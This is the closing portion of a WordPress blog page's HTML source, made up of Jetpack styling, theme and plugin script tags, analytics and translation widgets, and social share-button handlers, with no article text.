.components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email input[type=email]{height:auto;margin:0;width:100%}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-submit,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-submit{line-height:0;margin:0;padding:0}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__show-subs .wp-block-jetpack-subscriptions__subscount{font-size:16px;margin:8px 0;text-align:end}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline .wp-block-jetpack-subscriptions__form-elements{display:block}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline button{display:inline-block;max-width:100%}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline .wp-block-jetpack-subscriptions__subscount{text-align:start}#subscribe-submit.is-link{text-align:center;width:auto!important}#subscribe-submit.is-link a{margin-left:0!important;margin-top:0!important;width:auto!important}@keyframes jetpack-memberships_button__spinner-animation{to{transform:rotate(1turn)}}.jetpack-memberships-spinner{display:none;height:1em;margin:0 0 0 5px;width:1em}.jetpack-memberships-spinner svg{height:100%;margin-bottom:-2px;width:100%}.jetpack-memberships-spinner-rotating{animation:jetpack-memberships_button__spinner-animation .75s linear infinite;transform-origin:center}.is-loading .jetpack-memberships-spinner{display:inline-block}body.jetpack-memberships-modal-open{overflow:hidden}dialog.jetpack-memberships-modal{opacity:1}dialog.jetpack-memberships-modal,dialog.jetpack-memberships-modal iframe{background:#0000;border:0;bottom:0;box-shadow:none;height:100%;left:0;margin:0;padding:0;position:fixed;right:0;top:0;width:100%}dialog.jetpack-memberships-modal::backdrop{background-color:#000;opacity:.7;transition:opacity .2s ease-out}dialog.jetpack-memberships-modal.is-loading,dialog.jetpack-memberships-modal.is-loading::backdrop{opacity:0}
</style>
<script type="a9e82b8cbaa2b80ee152d32d-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/js/navigation.min.js?ver=6.6.2" id="freenews-navigation-js"></script>
<script type="a9e82b8cbaa2b80ee152d32d-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/js/skip-link-focus-fix.js?ver=6.6.2" id="freenews-skip-link-focus-fix-js"></script>
<script type="a9e82b8cbaa2b80ee152d32d-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky-sidebar/ResizeSensor.min.js?ver=6.6.2" id="ResizeSensor-js"></script>
<script type="a9e82b8cbaa2b80ee152d32d-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky-sidebar/theia-sticky-sidebar.min.js?ver=6.6.2" id="theia-sticky-sidebar-js"></script>
<script type="a9e82b8cbaa2b80ee152d32d-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/slick/slick.min.js?ver=6.6.2" id="slick-js"></script>
<script type="a9e82b8cbaa2b80ee152d32d-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/slick/slick-settings.js?ver=6.6.2" id="freenews-slick-settings-js"></script>
<script type="a9e82b8cbaa2b80ee152d32d-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky/jquery.sticky.js?ver=6.6.2" id="jquery-sticky-js"></script>
<script type="a9e82b8cbaa2b80ee152d32d-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky/sticky-setting.js?ver=6.6.2" id="freenews-sticky-settings-js"></script>
<script type="a9e82b8cbaa2b80ee152d32d-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/marquee/jquery.marquee.min.js?ver=6.6.2" id="marquee-js"></script>
<script type="a9e82b8cbaa2b80ee152d32d-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/marquee/marquee-settings.js?ver=6.6.2" id="freenews-marquee-settings-js"></script>
<script type="a9e82b8cbaa2b80ee152d32d-text/javascript" src="https://stats.wp.com/e-202443.js" id="jetpack-stats-js" data-wp-strategy="defer"></script>
<script type="a9e82b8cbaa2b80ee152d32d-text/javascript" id="jetpack-stats-js-after">
/* <![CDATA[ */
_stq = window._stq || [];
_stq.push([ "view", JSON.parse("{\"v\":\"ext\",\"blog\":\"175340963\",\"post\":\"30547\",\"tz\":\"0\",\"srv\":\"thedfirreport.com\",\"j\":\"1:13.9.1\"}") ]);
_stq.push([ "clickTrackerInit", "175340963", "30547" ]);
/* ]]> */
</script>
<script type="a9e82b8cbaa2b80ee152d32d-text/javascript" id="google-translate-init-js-extra">
/* <![CDATA[ */
var _wp_google_translate_widget = {"lang":"en_US","layout":"0"};
/* ]]> */
</script>
<script type="a9e82b8cbaa2b80ee152d32d-text/javascript" src="https://c0.wp.com/p/jetpack/13.9.1/_inc/build/widgets/google-translate/google-translate.min.js" id="google-translate-init-js"></script>
<script type="a9e82b8cbaa2b80ee152d32d-text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit&amp;ver=13.9.1" id="google-translate-js"></script>
<script type="a9e82b8cbaa2b80ee152d32d-text/javascript" src="https://c0.wp.com/c/6.6.2/wp-includes/js/dist/vendor/wp-polyfill.min.js" id="wp-polyfill-js"></script>
<script type="a9e82b8cbaa2b80ee152d32d-text/javascript" id="jetpack-blocks-assets-base-url-js-before">
/* <![CDATA[ */
var Jetpack_Block_Assets_Base_Url="https://thedfirreport.com/wp-content/plugins/jetpack/_inc/blocks/";
/* ]]> */
</script>
<script type="a9e82b8cbaa2b80ee152d32d-text/javascript" src="https://c0.wp.com/c/6.6.2/wp-includes/js/dist/dom-ready.min.js" id="wp-dom-ready-js"></script>
<script type="a9e82b8cbaa2b80ee152d32d-text/javascript" src="https://thedfirreport.com/wp-content/plugins/jetpack/_inc/blocks/subscriptions/view.js?minify=false&amp;ver=13.9.1" id="jetpack-block-subscriptions-js"></script>
<script type="a9e82b8cbaa2b80ee152d32d-text/javascript" id="sharing-js-js-extra">
/* <![CDATA[ */
var sharing_js_options = {"lang":"en","counts":"1","is_stats_active":"1"};
/* ]]> */
</script>
<script type="a9e82b8cbaa2b80ee152d32d-text/javascript" src="https://c0.wp.com/p/jetpack/13.9.1/_inc/build/sharedaddy/sharing.min.js" id="sharing-js-js"></script>
<script type="a9e82b8cbaa2b80ee152d32d-text/javascript" id="sharing-js-js-after">
/* <![CDATA[ */
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-twitter' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-twitter' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomtwitter', 'menubar=1,resizable=1,width=600,height=350' );
						return false;
					}
				} );
			} )();
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-linkedin' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-linkedin' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomlinkedin', 'menubar=1,resizable=1,width=580,height=450' );
						return false;
					}
				} );
			} )();
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-facebook' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-facebook' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomfacebook', 'menubar=1,resizable=1,width=600,height=400' );
						return false;
					}
				} );
			} )();
/* ]]> */
</script>

<script src="/cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js" data-cf-settings="a9e82b8cbaa2b80ee152d32d-|49" defer></script></body>
</html>
